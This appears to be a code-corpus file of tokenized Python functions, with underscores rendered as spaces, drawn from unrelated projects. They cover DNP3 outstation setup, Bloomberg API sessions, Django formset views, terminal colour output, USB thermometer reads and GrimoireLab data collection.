def configure stack ( ) : stack config = asiodnp3 . Outstation Stack Config ( opendnp3 . Database Sizes . All Types ( 10 ) ) stack config . outstation . event Buffer Config = opendnp3 . Event Buffer Config ( ) . All Types ( 10 ) stack config . outstation . params . allow Unsolicited = True stack config . link . Local Addr = 10 stack config . link . Remote Addr = 1 stack config . link . Keep Alive Timeout = openpal . Time Duration ( ) . Max ( ) return stack config
def Get Application IIN ( self ) : application iin = opendnp3 . Application IIN ( ) application iin . config Corrupt = False application iin . device Trouble = False application iin . local Control = False application iin . need Time = False # Just for testing purposes, convert it to an IIN Field and display the contents of the two bytes. iin field = application iin . To IIN ( ) log . debug ( 'Outstation Application.Get Application IIN: IIN Field LSB={}, MSB={}' . format ( iin field . LSB , iin field . MSB ) ) return application iin
def delete connection ( ) : if CON SYM in globals ( ) : con = globals ( ) . pop ( CON SYM ) if not getattr ( con , ' session' ) . start ( ) : con . stop ( )
def parse markdown ( ) : readme file = f'{PACKAGE ROOT}/README.md' if path . exists ( readme file ) : with open ( readme file , 'r' , encoding = 'utf-8' ) as f : long description = f . read ( ) return long description
def parse description ( markdown = True ) : if markdown : return parse markdown ( ) try : from pypandoc import convert readme file = f'{PACKAGE ROOT}/docs/index.rst' if not path . exists ( readme file ) : raise Import Error return convert ( readme file , 'rst' ) except Import Error : return parse markdown ( )
def to gen ( iterable ) : from collections import Iterable for elm in iterable : if isinstance ( elm , Iterable ) and not isinstance ( elm , ( str , bytes ) ) : yield from flatten ( elm ) else : yield elm
def missing info ( * * kwargs ) -> str : func = kwargs . pop ( 'func' , 'unknown' ) if 'ticker' in kwargs : kwargs [ 'ticker' ] = kwargs [ 'ticker' ] . replace ( '/' , ' ' ) info = utils . to str ( kwargs , fmt = '{value}' , sep = '/' ) [ 1 : - 1 ] return f'{func}/{info}'
def update missing ( * * kwargs ) : data path = os . environ . get ( BBG ROOT , '' ) . replace ( '\\' , '/' ) if not data path : return if len ( kwargs ) == 0 : return log path = f'{data path}/Logs/{missing info(**kwargs)}' cnt = len ( files . all files ( log path ) ) + 1 files . create folder ( log path ) open ( f'{log path}/{cnt}.log' , 'a' ) . close ( )
def start ( self ) : # flush event queue in defensive way logger = get logger ( self . debug ) started = self . session . start ( ) if started : ev = self . session . next Event ( ) ev name = EVENT DICT [ ev . event Type ( ) ] logger . info ( 'Event Type: {!r}' . format ( ev name ) ) for msg in ev : logger . info ( 'Message Received:\n{}' . format ( msg ) ) if ev . event Type ( ) != blpapi . Event . SESSION STATUS : raise Runtime Error ( 'Expected a "SESSION STATUS" event but ' 'received a {!r}' . format ( ev name ) ) ev = self . session . next Event ( ) ev name = EVENT DICT [ ev . event Type ( ) ] logger . info ( 'Event Type: {!r}' . format ( ev name ) ) for msg in ev : logger . info ( 'Message Received:\n{}' . format ( msg ) ) if ev . event Type ( ) != blpapi . Event . SESSION STATUS : raise Runtime Error ( 'Expected a "SESSION STATUS" event but ' 'received a {!r}' . format ( ev name ) ) else : ev = self . session . next Event ( self . timeout ) if ev . event Type ( ) == blpapi . Event . SESSION STATUS : for msg in ev : logger . warning ( 'Message Received:\n{}' . format ( msg ) ) raise Connection Error ( 'Could not start blpapi.Session' ) self . init services ( ) return self
def init services ( self ) : logger = get logger ( self . debug ) # flush event queue in defensive way opened = self . session . open Service ( '//blp/refdata' ) ev = self . session . next Event ( ) ev name = EVENT DICT [ ev . event Type ( ) ] logger . info ( 'Event Type: {!r}' . format ( ev name ) ) for msg in ev : logger . info ( 'Message Received:\n{}' . format ( msg ) ) if ev . event Type ( ) != blpapi . Event . SERVICE STATUS : raise Runtime Error ( 'Expected a "SERVICE STATUS" event but ' 'received a {!r}' . format ( ev name ) ) if not opened : logger . warning ( 'Failed to open //blp/refdata' ) raise Connection Error ( 'Could not open a //blp/refdata service' ) self . ref Data Service = self . session . get Service ( '//blp/refdata' ) opened = self . session . open Service ( '//blp/exrsvc' ) ev = self . session . next Event ( ) ev name = EVENT DICT [ ev . event Type ( ) ] logger . info ( 'Event Type: {!r}' . format ( ev name ) ) for msg in ev : logger . info ( 'Message Received:\n{}' . format ( msg ) ) if ev . event Type ( ) != blpapi . Event . SERVICE STATUS : raise Runtime Error ( 'Expected a "SERVICE STATUS" event but ' 'received a {!r}' . format ( ev name ) ) if not opened : logger . warning ( 'Failed to open //blp/exrsvc' ) raise Connection Error ( 'Could not open a //blp/exrsvc service' ) self . exr Service = self . session . get Service ( '//blp/exrsvc' ) return self
def adjust delay ( self , slot , response ) : if response . status in self . retry http codes : new delay = max ( slot . delay , 1 ) * 4 new delay = max ( new delay , self . mindelay ) new delay = min ( new delay , self . maxdelay ) slot . delay = new delay self . stats . inc value ( 'delay count' ) elif response . status == 200 : new delay = max ( slot . delay / 2 , self . mindelay ) if new delay < 0.01 : new delay = 0 slot . delay = new delay
def memberness ( context ) : if context : texts = context . xpath ( './/*[local-name()="explicit Member"]/text()' ) . extract ( ) text = str ( texts ) . lower ( ) if len ( texts ) > 1 : return 2 elif 'country' in text : return 2 elif 'member' not in text : return 0 elif 'successor' in text : # 'Successor Member' is a rare case that shouldn't be treated as member return 1 elif 'parent' in text : return 2 return 3
def parse 10qk ( self , response ) : loader = Report Item Loader ( response = response ) item = loader . load item ( ) if 'doc type' in item : doc type = item [ 'doc type' ] if doc type in ( '10-Q' , '10-K' ) : return item return None
def find lcs ( self , node , string Idxs ) : nodes = [ self . find lcs ( n , string Idxs ) for ( n , ) in node . transition links if n . generalized idxs . issuperset ( string Idxs ) ] if nodes == [ ] : return node deepest Node = max ( nodes , key = lambda n : n . depth ) return deepest Node
def generalized word starts ( self , xs ) : self . word starts = [ ] i = 0 for n in range ( len ( xs ) ) : self . word starts . append ( i ) i += len ( xs [ n ] ) + 1
def edge Label ( self , node , parent ) : return self . word [ node . idx + parent . depth : node . idx + node . depth ]
def query ( self , i , j ) : if self . queries cnt < self . max queries cnt : self . queries cnt += 1 return self . labels [ i ] == self . labels [ j ] else : raise Maximum Queries Exceeded
def preprocess constraints ( ml , cl , n ) : # Represent the graphs using adjacency-lists ml graph , cl graph = { } , { } for i in range ( n ) : ml graph [ i ] = set ( ) cl graph [ i ] = set ( ) def add both ( d , i , j ) : d [ i ] . add ( j ) d [ j ] . add ( i ) for ( i , j ) in ml : ml graph [ i ] . add ( j ) ml graph [ j ] . add ( i ) for ( i , j ) in cl : cl graph [ i ] . add ( j ) cl graph [ j ] . add ( i ) def dfs ( i , graph , visited , component ) : visited [ i ] = True for j in graph [ i ] : if not visited [ j ] : dfs ( j , graph , visited , component ) component . append ( i ) # Run DFS from each node to get all the graph's components # and add an edge for each pair of nodes in the component (create a complete graph) # See http://www.techiedelight.com/transitive-closure-graph/ for more details visited = [ False ] * n neighborhoods = [ ] for i in range ( n ) : if not visited [ i ] and ml graph [ i ] : component = [ ] dfs ( i , ml graph , visited , component ) for x1 in component : for x2 in component : if x1 != x2 : ml graph [ x1 ] . add ( x2 ) neighborhoods . append ( component ) for ( i , j ) in cl : for x in ml graph [ i ] : add both ( cl graph , x , j ) for y in ml graph [ j ] : add both ( cl graph , i , y ) for x in ml graph [ i ] : for y in ml graph [ j ] : add both ( cl graph , x , y ) for i in ml graph : for j in ml graph [ i ] : if j != i and j in cl graph [ i ] : raise Inconsistent Constraints Exception ( 'Inconsistent constraints between {} and {}' . format ( i , j ) ) return ml graph , cl graph , neighborhoods
def construct formset ( self ) : formset class = self . get formset ( ) if hasattr ( self , 'get extra form kwargs' ) : klass = type ( self ) . name raise Deprecation Warning ( 'Calling {0}.get extra form kwargs is no longer supported. ' 'Set `form kwargs` in {0}.formset kwargs or override ' '{0}.get formset kwargs() directly.' . format ( klass ) , ) return formset class ( * * self . get formset kwargs ( ) )
def get formset kwargs ( self ) : kwargs = self . formset kwargs . copy ( ) kwargs . update ( { 'initial' : self . get initial ( ) , 'prefix' : self . get prefix ( ) , } ) if self . request . method in ( 'POST' , 'PUT' ) : kwargs . update ( { 'data' : self . request . POST . copy ( ) , 'files' : self . request . FILES , } ) return kwargs
def get factory kwargs ( self ) : # Perform deprecation check for attr in [ 'extra' , 'max num' , 'can order' , 'can delete' , 'ct field' , 'formfield callback' , 'fk name' , 'widgets' , 'ct fk field' ] : if hasattr ( self , attr ) : klass = type ( self ) . name raise Deprecation Warning ( 'Setting `{0}.{1}` at the class level is now deprecated. ' 'Set `{0}.factory kwargs` instead.' . format ( klass , attr ) ) kwargs = self . factory kwargs . copy ( ) if self . get formset class ( ) : kwargs [ 'formset' ] = self . get formset class ( ) return kwargs
def get success url ( self ) : if self . success url : url = self . success url else : # Default to returning to the same page url = self . request . get full path ( ) return url
def get formset kwargs ( self ) : kwargs = super ( Model Form Set Mixin , self ) . get formset kwargs ( ) kwargs [ 'queryset' ] = self . get queryset ( ) return kwargs
def formset valid ( self , formset ) : self . object list = formset . save ( ) return super ( Model Form Set Mixin , self ) . formset valid ( formset )
def get formset kwargs ( self ) : # Perform deprecation check if hasattr ( self , 'save as new' ) : klass = type ( self ) . name raise Deprecation Warning ( 'Setting `{0}.save as new` at the class level is now ' 'deprecated. Set `{0}.formset kwargs` instead.' . format ( klass ) ) kwargs = super ( Base Inline Form Set Factory , self ) . get formset kwargs ( ) kwargs [ 'instance' ] = self . object return kwargs
def get factory kwargs ( self ) : kwargs = super ( Base Inline Form Set Factory , self ) . get factory kwargs ( ) kwargs . setdefault ( 'fields' , self . fields ) kwargs . setdefault ( 'exclude' , self . exclude ) if self . get form class ( ) : kwargs [ 'form' ] = self . get form class ( ) return kwargs
def get ( self , request , * args , * * kwargs ) : formset = self . construct formset ( ) return self . render to response ( self . get context data ( formset = formset ) )
def forms valid ( self , form , inlines ) : response = self . form valid ( form ) for formset in inlines : formset . save ( ) return response
def construct inlines ( self ) : inline formsets = [ ] for inline class in self . get inlines ( ) : inline instance = inline class ( self . model , self . request , self . object , self . kwargs , self ) inline formset = inline instance . construct formset ( ) inline formsets . append ( inline formset ) return inline formsets
def get ( self , request , * args , * * kwargs ) : form class = self . get form class ( ) form = self . get form ( form class ) inlines = self . construct inlines ( ) return self . render to response ( self . get context data ( form = form , inlines = inlines , * * kwargs ) )
def get params for field ( self , field name , sort type = None ) : if not sort type : if self . initial sort == field name : sort type = 'desc' if self . initial sort type == 'asc' else 'asc' else : sort type = 'asc' self . initial params [ self . sort param name ] = self . sort fields [ field name ] self . initial params [ self . sort type param name ] = sort type return '?%s' % self . initial params . urlencode ( )
def get start date ( self , obj ) : obj date = getattr ( obj , self . get date field ( ) ) try : obj date = obj date . date ( ) except Attribute Error : # It's a date rather than datetime, so we use it as is pass return obj date
def get end date ( self , obj ) : obj date = getattr ( obj , self . get end date field ( ) ) try : obj date = obj date . date ( ) except Attribute Error : # It's a date rather than datetime, so we use it as is pass return obj date
def get queryset ( self ) : qs = super ( Base Calendar Month View , self ) . get queryset ( ) year = self . get year ( ) month = self . get month ( ) date field = self . get date field ( ) end date field = self . get end date field ( ) date = date from string ( year , self . get year format ( ) , month , self . get month format ( ) ) since = date until = self . get next month ( date ) # Adjust our start and end dates to allow for next and previous # month edges if since . weekday ( ) != self . get first of week ( ) : diff = math . fabs ( since . weekday ( ) - self . get first of week ( ) ) since = since - datetime . timedelta ( days = diff ) if until . weekday ( ) != ( ( self . get first of week ( ) + 6 ) % 7 ) : diff = math . fabs ( ( ( self . get first of week ( ) + 6 ) % 7 ) - until . weekday ( ) ) until = until + datetime . timedelta ( days = diff ) if end date field : # 5 possible conditions for showing an event: # 1) Single day event, starts after 'since' # 2) Multi-day event, starts after 'since' and ends before 'until' # 3) Starts before 'since' and ends after 'since' and before 'until' # 4) Starts after 'since' but before 'until' and ends after 'until' # 5) Starts before 'since' and ends after 'until' predicate1 = Q ( * * { '%s gte' % date field : since , end date field : None } ) predicate2 = Q ( * * { '%s gte' % date field : since , '%s lt' % end date field : until } ) predicate3 = Q ( * * { '%s lt' % date field : since , '%s gte' % end date field : since , '%s lt' % end date field : until } ) predicate4 = Q ( * * { '%s gte' % date field : since , '%s lt' % date field : until , '%s gte' % end date field : until } ) predicate5 = Q ( * * { '%s lt' % date field : since , '%s gte' % end date field : until } ) return qs . filter ( predicate1 | predicate2 | predicate3 | predicate4 | predicate5 ) return qs . filter ( * * { '%s gte' % date field : since } )
def read version ( ) : finder = Version Finder ( ) path = os . path . join ( PROJECT ROOT , 'colorful' , ' init .py' ) with codecs . open ( path , 'r' , encoding = 'utf-8' ) as fp : file data = fp . read ( ) . encode ( 'utf-8' ) finder . visit ( ast . parse ( file data ) ) return finder . version
def with setup ( self , colormode = None , colorpalette = None , extend colors = False ) : colorful = Colorful ( colormode = self . colorful . colormode , colorpalette = copy . copy ( self . colorful . colorpalette ) ) colorful . setup ( colormode = colormode , colorpalette = colorpalette , extend colors = extend colors ) yield colorful
def show ( ) : # modifiers sys . stdout . write ( colorful . bold ( 'bold' ) + ' ' ) sys . stdout . write ( colorful . dimmed ( 'dimmed' ) + ' ' ) sys . stdout . write ( colorful . italic ( 'italic' ) + ' ' ) sys . stdout . write ( colorful . underlined ( 'underlined' ) + ' ' ) sys . stdout . write ( colorful . inversed ( 'inversed' ) + ' ' ) sys . stdout . write ( colorful . concealed ( 'concealed' ) + ' ' ) sys . stdout . write ( colorful . struckthrough ( 'struckthrough' ) + '\n' ) # foreground colors sys . stdout . write ( colorful . red ( 'red' ) + ' ' ) sys . stdout . write ( colorful . green ( 'green' ) + ' ' ) sys . stdout . write ( colorful . yellow ( 'yellow' ) + ' ' ) sys . stdout . write ( colorful . blue ( 'blue' ) + ' ' ) sys . stdout . write ( colorful . magenta ( 'magenta' ) + ' ' ) sys . stdout . write ( colorful . cyan ( 'cyan' ) + ' ' ) sys . stdout . write ( colorful . white ( 'white' ) + '\n' ) # background colors sys . stdout . write ( colorful . on red ( 'red' ) + ' ' ) sys . stdout . write ( colorful . on green ( 'green' ) + ' ' ) sys . stdout . write ( colorful . on yellow ( 'yellow' ) + ' ' ) sys . stdout . write ( colorful . on blue ( 'blue' ) + ' ' ) sys . stdout . write ( colorful . on magenta ( 'magenta' ) + ' ' ) sys . stdout . write ( colorful . on cyan ( 'cyan' ) + ' ' ) sys . stdout . write ( colorful . on white ( 'white' ) + '\n' )
def show ( ) : with colorful . with style ( 'monokai' ) as c : # modifiers sys . stdout . write ( c . bold ( 'bold' ) + ' ' ) sys . stdout . write ( c . dimmed ( 'dimmed' ) + ' ' ) sys . stdout . write ( c . italic ( 'italic' ) + ' ' ) sys . stdout . write ( c . underlined ( 'underlined' ) + ' ' ) sys . stdout . write ( c . inversed ( 'inversed' ) + ' ' ) sys . stdout . write ( c . concealed ( 'concealed' ) + ' ' ) sys . stdout . write ( c . struckthrough ( 'struckthrough' ) + '\n' ) # foreground colors sys . stdout . write ( c . orange ( 'orange' ) + ' ' ) sys . stdout . write ( c . magenta ( 'magenta' ) + ' ' ) sys . stdout . write ( c . purple ( 'purple' ) + ' ' ) sys . stdout . write ( c . blue ( 'blue' ) + ' ' ) sys . stdout . write ( c . sea Green ( 'sea green' ) + ' ' ) sys . stdout . write ( c . green ( 'green' ) + ' ' ) sys . stdout . write ( c . yellow ( 'yellow' ) + '\n' ) # background colors sys . stdout . write ( c . on orange ( 'orange' ) + ' ' ) sys . stdout . write ( c . on magenta ( 'magenta' ) + ' ' ) sys . stdout . write ( c . on purple ( 'purple' ) + ' ' ) sys . stdout . write ( c . on blue ( 'blue' ) + ' ' ) sys . stdout . write ( c . on sea Green ( 'sea green' ) + ' ' ) sys . stdout . write ( c . gray on green ( 'green' ) + ' ' ) sys . stdout . write ( c . gray on yellow ( 'yellow' ) + '\n' )
def rgb to ansi256 ( r , g , b ) : if r == g and g == b : if r < 8 : return 16 if r > 248 : return 231 return round ( ( ( r - 8 ) / 247.0 ) * 24 ) + 232 ansi r = 36 * round ( r / 255.0 * 5.0 ) ansi g = 6 * round ( g / 255.0 * 5.0 ) ansi b = round ( b / 255.0 * 5.0 ) ansi = 16 + ansi r + ansi g + ansi b return ansi
def rgb to ansi16 ( r , g , b , use bright = False ) : ansi b = round ( b / 255.0 ) << 2 ansi g = round ( g / 255.0 ) << 1 ansi r = round ( r / 255.0 ) ansi = ( 90 if use bright else 30 ) + ( ansi b | ansi g | ansi r ) return ansi
def show ( ) : with colorful . with style ( 'solarized' ) as c : # modifiers sys . stdout . write ( c . bold ( 'bold' ) + ' ' ) sys . stdout . write ( c . dimmed ( 'dimmed' ) + ' ' ) sys . stdout . write ( c . italic ( 'italic' ) + ' ' ) sys . stdout . write ( c . underlined ( 'underlined' ) + ' ' ) sys . stdout . write ( c . inversed ( 'inversed' ) + ' ' ) sys . stdout . write ( c . concealed ( 'concealed' ) + ' ' ) sys . stdout . write ( c . struckthrough ( 'struckthrough' ) + '\n' ) # foreground colors sys . stdout . write ( c . yellow ( 'yellow' ) + ' ' ) sys . stdout . write ( c . red ( 'orange' ) + ' ' ) sys . stdout . write ( c . red ( 'red' ) + ' ' ) sys . stdout . write ( c . magenta ( 'magenta' ) + ' ' ) sys . stdout . write ( c . magenta ( 'violet' ) + ' ' ) sys . stdout . write ( c . blue ( 'blue' ) + ' ' ) sys . stdout . write ( c . cyan ( 'cyan' ) + ' ' ) sys . stdout . write ( c . green ( 'green' ) + '\n' ) # background colors sys . stdout . write ( c . on yellow ( 'yellow' ) + ' ' ) sys . stdout . write ( c . on red ( 'orange' ) + ' ' ) sys . stdout . write ( c . on red ( 'red' ) + ' ' ) sys . stdout . write ( c . on magenta ( 'magenta' ) + ' ' ) sys . stdout . write ( c . on magenta ( 'violet' ) + ' ' ) sys . stdout . write ( c . on blue ( 'blue' ) + ' ' ) sys . stdout . write ( c . on cyan ( 'cyan' ) + ' ' ) sys . stdout . write ( c . on green ( 'green' ) + '\n' )
def colorpalette ( self , colorpalette ) : if isinstance ( colorpalette , str ) : # we assume it's a path to a color file colorpalette = colors . parse colors ( colorpalette ) self . colorpalette = colors . sanitize color palette ( colorpalette )
def readattr ( path , name ) : try : f = open ( USB SYS PREFIX + path + "/" + name ) return f . readline ( ) . rstrip ( "\n" ) except IO Error : return None
def get data ( self , reset device = False ) : try : if reset device : self . device . reset ( ) # detach kernel driver from both interfaces if attached, so we can set configuration() for interface in [ 0 , 1 ] : if self . device . is kernel driver active ( interface ) : LOGGER . debug ( 'Detaching kernel driver for interface %d ' 'of %r on ports %r' , interface , self . device , self . ports ) self . device . detach kernel driver ( interface ) self . device . set configuration ( ) # Prevent kernel message: # "usbfs: process <PID> (python) did not claim interface x before use" # This will become unnecessary once pull-request #124 for # Py USB has been accepted and we depend on a fixed release # of Py USB.  Until then, and even with the fix applied, it # does not hurt to explicitly claim the interface. usb . util . claim interface ( self . device , INTERFACE ) # Turns out we don't actually need that ctrl transfer. # Disabling this reduces number of USB Errors from ~7/30 to 0! #self. device.ctrl transfer(bm Request Type=0x21, b Request=0x09, #    w Value=0x0201, w Index=0x00, data or w Length='\x01\x01', #    timeout=TIMEOUT) # Magic: Our TEM Per V1.4 likes to be asked twice.  When # only asked once, it get's stuck on the next access and # requires a reset. self . control transfer ( COMMANDS [ 'temp' ] ) self . interrupt read ( ) # Turns out a whole lot of that magic seems unnecessary. #self. control transfer(COMMANDS['ini1']) #self. interrupt read() #self. control transfer(COMMANDS['ini2']) #self. interrupt read() #self. interrupt read() # Get temperature self . control transfer ( COMMANDS [ 'temp' ] ) temp data = self . interrupt read ( ) # Get humidity if self . device . product == 'TEM Per1F H1 V1.4' : humidity data = temp data else : humidity data = None # Combine temperature and humidity data data = { 'temp data' : temp data , 'humidity data' : humidity data } # Be a nice citizen and undo potential interface claiming. usb . util . dispose resources ( self . device ) return data except usb . USB Error as err : if not reset device : LOGGER . warning ( "Encountered %s, resetting %r and trying again." , err , self . device ) return self . get data ( True ) # Catch the permissions exception and add our message if "not permitted" in str ( err ) : raise Exception ( "Permission problem accessing USB. " "Maybe I need to run as root?" ) else : LOGGER . error ( err ) raise
def get temperature ( self , format = 'celsius' , sensor = 0 ) : results = self . get temperatures ( sensors = [ sensor , ] ) if format == 'celsius' : return results [ sensor ] [ 'temperature c' ] elif format == 'fahrenheit' : return results [ sensor ] [ 'temperature f' ] elif format == 'millicelsius' : return results [ sensor ] [ 'temperature mc' ] else : raise Value Error ( "Unknown format" )
def interrupt read ( self ) : data = self . device . read ( ENDPOINT , REQ INT LEN , timeout = TIMEOUT ) LOGGER . debug ( 'Read data: %r' , data ) return data
def measure memory ( cls , obj , seen = None ) : size = sys . getsizeof ( obj ) if seen is None : seen = set ( ) obj id = id ( obj ) if obj id in seen : return 0 # Important mark as seen *before* entering recursion to gracefully handle # self-referential objects seen . add ( obj id ) if isinstance ( obj , dict ) : size += sum ( [ cls . measure memory ( v , seen ) for v in obj . values ( ) ] ) size += sum ( [ cls . measure memory ( k , seen ) for k in obj . keys ( ) ] ) elif hasattr ( obj , ' dict ' ) : size += cls . measure memory ( obj . dict , seen ) elif hasattr ( obj , ' iter ' ) and not isinstance ( obj , ( str , bytes , bytearray ) ) : size += sum ( [ cls . measure memory ( i , seen ) for i in obj ] ) return size
def feed arthur ( self ) : with self . ARTHUR FEED LOCK : # This is a expensive operation so don't do it always if ( time . time ( ) - self . ARTHUR LAST MEMORY CHECK ) > 5 * self . ARTHUR LAST MEMORY CHECK TIME : self . ARTHUR LAST MEMORY CHECK = time . time ( ) logger . debug ( "Measuring the memory used by the raw items dict ..." ) try : memory size = self . measure memory ( self . arthur items ) / ( 1024 * 1024 ) except Runtime Error as ex : # During memory usage measure, other thread could change the dict logger . warning ( "Can't get the memory used by the raw items dict: %s" , ex ) memory size = self . ARTHUR LAST MEMORY SIZE self . ARTHUR LAST MEMORY CHECK TIME = time . time ( ) - self . ARTHUR LAST MEMORY CHECK logger . debug ( "Arthur items memory size: %0.2f MB (%is to check)" , memory size , self . ARTHUR LAST MEMORY CHECK TIME ) self . ARTHUR LAST MEMORY SIZE = memory size # Don't feed items from redis if the current python dict is # larger than ARTHUR MAX MEMORY SIZE if self . ARTHUR LAST MEMORY SIZE > self . ARTHUR MAX MEMORY SIZE : logger . debug ( "Items queue full. Not collecting items from redis queue." ) return logger . info ( "Collecting items from redis queue" ) db url = self . config . get conf ( ) [ 'es collection' ] [ 'redis url' ] conn = redis . Strict Redis . from url ( db url ) logger . debug ( "Redis connection stablished with %s." , db url ) # Get and remove queued items in an atomic transaction pipe = conn . pipeline ( ) # pipe.lrange(Q STORAGE ITEMS, 0, -1) pipe . lrange ( Q STORAGE ITEMS , 0 , self . ARTHUR REDIS ITEMS - 1 ) pipe . ltrim ( Q STORAGE ITEMS , self . ARTHUR REDIS ITEMS , - 1 ) items = pipe . execute ( ) [ 0 ] for item in items : arthur item = pickle . loads ( item ) if arthur item [ 'tag' ] not in self . arthur items : self . arthur items [ arthur item [ 'tag' ] ] = [ ] self . arthur items [ arthur item [ 'tag' ] ] . append ( arthur item ) for tag in self . arthur items : if self . arthur items [ tag ] : logger . debug ( "Arthur items for %s: %i" , tag , len ( self . arthur items [ tag ] ) )
def feed backend arthur ( self , repo ) : # Always get pending items from arthur for all data sources self . feed arthur ( ) tag = self . backend tag ( repo ) logger . debug ( "Arthur items available for %s" , self . arthur items . keys ( ) ) logger . debug ( "Getting arthur items for %s." , tag ) if tag in self . arthur items : logger . debug ( "Found items for %s." , tag ) while self . arthur items [ tag ] : yield self . arthur items [ tag ] . pop ( )
def sha github file ( cls , config , repo file , repository api , repository branch ) : repo file sha = None cfg = config . get conf ( ) github token = cfg [ 'sortinghat' ] [ 'identities api token' ] headers = { "Authorization" : "token " + github token } url dir = repository api + "/git/trees/" + repository branch logger . debug ( "Gettting sha data from tree: %s" , url dir ) raw repo file info = requests . get ( url dir , headers = headers ) raw repo file info . raise for status ( ) for rfile in raw repo file info . json ( ) [ 'tree' ] : if rfile [ 'path' ] == repo file : logger . debug ( "SHA found: %s, " , rfile [ "sha" ] ) repo file sha = rfile [ "sha" ] break return repo file sha
def get uuids from profile name ( self , profile name ) : uuids = [ ] with self . db . connect ( ) as session : query = session . query ( Profile ) . filter ( Profile . name == profile name ) profiles = query . all ( ) if profiles : for p in profiles : uuids . append ( p . uuid ) return uuids
def config logging ( debug ) : if debug : logging . basic Config ( level = logging . DEBUG , format = '%(asctime)s %(message)s' ) logging . debug ( "Debug mode activated" ) else : logging . basic Config ( level = logging . INFO , format = '%(asctime)s %(message)s' )
def get params parser ( ) : parser = argparse . Argument Parser ( add help = False ) parser . add argument ( '-g' , '--debug' , dest = 'debug' , action = 'store true' , help = argparse . SUPPRESS ) parser . add argument ( "--arthur" , action = 'store true' , dest = 'arthur' , help = "Enable arthur to collect raw data" ) parser . add argument ( "--raw" , action = 'store true' , dest = 'raw' , help = "Activate raw task" ) parser . add argument ( "--enrich" , action = 'store true' , dest = 'enrich' , help = "Activate enrich task" ) parser . add argument ( "--identities" , action = 'store true' , dest = 'identities' , help = "Activate merge identities task" ) parser . add argument ( "--panels" , action = 'store true' , dest = 'panels' , help = "Activate panels task" ) parser . add argument ( "--cfg" , dest = 'cfg path' , help = "Configuration file path" ) parser . add argument ( "--backends" , dest = 'backend sections' , default = [ ] , nargs = '*' , help = "Backend sections to execute" ) if len ( sys . argv ) == 1 : parser . print help ( ) sys . exit ( 1 ) return parser
def get params ( ) : parser = get params parser ( ) args = parser . parse args ( ) if not args . raw and not args . enrich and not args . identities and not args . panels : print ( "No tasks enabled" ) sys . exit ( 1 ) return args
def get menu entries ( self , kibiter major ) : menu entries = [ ] for entry in self . panels menu : if entry [ 'source' ] not in self . data sources : continue parent menu item = { 'name' : entry [ 'name' ] , 'title' : entry [ 'name' ] , 'description' : "" , 'type' : "menu" , 'dashboards' : [ ] } for subentry in entry [ 'menu' ] : try : dash name = get dashboard name ( subentry [ 'panel' ] ) except File Not Found Error : logging . error ( "Can't open dashboard file %s" , subentry [ 'panel' ] ) continue # The name for the entry is in self.panels menu child item = { "name" : subentry [ 'name' ] , "title" : subentry [ 'name' ] , "description" : "" , "type" : "entry" , "panel id" : dash name } parent menu item [ 'dashboards' ] . append ( child item ) menu entries . append ( parent menu item ) return menu entries
def get dash menu ( self , kibiter major ) : # omenu = Ordered Dict() omenu = [ ] # Start with Overview omenu . append ( self . menu panels common [ 'Overview' ] ) # Now the data  getsources ds menu = self . get menu entries ( kibiter major ) # Remove the kafka and community menus, they will be included at the end kafka menu = None community menu = None found kafka = [ pos for pos , menu in enumerate ( ds menu ) if menu [ 'name' ] == KAFKA NAME ] if found kafka : kafka menu = ds menu . pop ( found kafka [ 0 ] ) found community = [ pos for pos , menu in enumerate ( ds menu ) if menu [ 'name' ] == COMMUNITY NAME ] if found community : community menu = ds menu . pop ( found community [ 0 ] ) ds menu . sort ( key = operator . itemgetter ( 'name' ) ) omenu += ds menu # If kafka and community are present add them before the Data Status and About if kafka menu : omenu . append ( kafka menu ) if community menu : omenu . append ( community menu ) # At the end Data Status, About omenu . append ( self . menu panels common [ 'Data Status' ] ) omenu . append ( self . menu panels common [ 'About' ] ) logger . debug ( "Menu for panels: %s" , json . dumps ( ds menu , indent = 4 ) ) return omenu
def autorefresh studies ( self , cfg ) : if 'studies' not in self . conf [ self . backend section ] or 'enrich areas of code:git' not in self . conf [ self . backend section ] [ 'studies' ] : logger . debug ( "Not doing autorefresh for studies, Areas of Code study is not active." ) return aoc index = self . conf [ 'enrich areas of code:git' ] . get ( 'out index' , Git Enrich . GIT AOC ENRICHED ) # if `out index` exists but has no value, use default if not aoc index : aoc index = Git Enrich . GIT AOC ENRICHED logger . debug ( "Autorefresh for Areas of Code study index: %s" , aoc index ) es = Elasticsearch ( [ self . conf [ 'es enrichment' ] [ 'url' ] ] , timeout = 100 , verify certs = self . get enrich backend ( ) . elastic . requests . verify ) if not es . indices . exists ( index = aoc index ) : logger . debug ( "Not doing autorefresh, index doesn't exist for Areas of Code study" ) return logger . debug ( "Doing autorefresh for Areas of Code study" ) # Create a Git Enrich backend tweaked to work with AOC index aoc backend = Git Enrich ( self . db sh , None , cfg [ 'projects' ] [ 'projects file' ] , self . db user , self . db password , self . db host ) aoc backend . mapping = None aoc backend . roles = [ 'author' ] elastic enrich = get elastic ( self . conf [ 'es enrichment' ] [ 'url' ] , aoc index , clean = False , backend = aoc backend ) aoc backend . set elastic ( elastic enrich ) self . autorefresh ( aoc backend , studies = True )
def studies ( self , retention time ) : cfg = self . config . get conf ( ) if 'studies' not in cfg [ self . backend section ] or not cfg [ self . backend section ] [ 'studies' ] : logger . debug ( 'No studies for %s' % self . backend section ) return studies = [ study for study in cfg [ self . backend section ] [ 'studies' ] if study . strip ( ) != "" ] if not studies : logger . debug ( 'No studies for %s' % self . backend section ) return logger . debug ( "Executing studies for %s: %s" % ( self . backend section , studies ) ) time . sleep ( 2 ) # Wait so enrichment has finished in ES enrich backend = self . get enrich backend ( ) ocean backend = self . get ocean backend ( enrich backend ) active studies = [ ] all studies = enrich backend . studies all studies names = [ study . name for study in enrich backend . studies ] # Time to check that configured studies are valid logger . debug ( "All studies in %s: %s" , self . backend section , all studies names ) logger . debug ( "Configured studies %s" , studies ) cfg studies types = [ study . split ( ":" ) [ 0 ] for study in studies ] if not set ( cfg studies types ) . issubset ( set ( all studies names ) ) : logger . error ( 'Wrong studies names for %s: %s' , self . backend section , studies ) raise Runtime Error ( 'Wrong studies names ' , self . backend section , studies ) for study in enrich backend . studies : if study . name in cfg studies types : active studies . append ( study ) enrich backend . studies = active studies print ( "Executing for %s the studies %s" % ( self . backend section , [ study for study in studies ] ) ) studies args = self . load studies ( ) do studies ( ocean backend , enrich backend , studies args , retention time = retention time ) # Return studies to its original value enrich backend . studies = all studies
